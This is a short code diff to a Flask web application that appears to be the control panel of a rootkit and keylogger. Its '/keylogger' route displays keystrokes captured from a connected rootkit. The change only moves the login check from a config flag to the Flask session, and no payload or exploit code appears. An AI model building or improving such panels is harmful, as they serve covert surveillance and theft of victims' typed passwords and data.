@@ -1,12 +1,12 @@
 from app import app
 import config as cfg
-from flask import render_template, redirect, url_for
+from flask import render_template, redirect, url_for, session
 
 # -------------------------------- KEYLOGGER -------------------------------- #
 
 @app.route('/keylogger')
 def keylogger():
-    if not cfg.authenticated:
+    if not session.get('authenticated'):
         return redirect(url_for('login'))
     try:
         with cfg.connection_lock:
@@ -20,4 +20,5 @@ def keylogger():
                 keylog_data = "Aucune connexion au rootkit."
     except Exception as e:
         keylog_data = f"Erreur : {e}"
+
     return render_template("keylogger.html", keylog_data=keylog_data)
